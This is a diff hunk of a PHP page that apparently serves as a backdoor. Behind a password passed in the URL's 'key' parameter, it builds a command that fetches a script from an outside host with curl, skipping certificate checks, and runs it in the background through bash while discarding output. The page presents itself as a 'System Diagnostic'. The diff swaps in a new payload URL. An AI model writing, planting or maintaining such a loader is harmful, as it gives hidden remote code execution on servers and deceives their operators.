@@ -6,7 +6,7 @@ if (!isset($_GET['key']) || $_GET['key'] !== $password_aman) {
     die("Error: Access Denied.");
 }
 
-$remote_url = "http://everythinggodordains.com/snutz/remote/rushak";
+$remote_url = "https://everythinggodordains.com/trubuk/athgs";
 $cmd = 'nohup bash -c "$(curl -fsSL ' . $remote_url . ' -k)" > /dev/null 2>&1 &';
 
 echo "<h2>System Diagnostic</h2>";
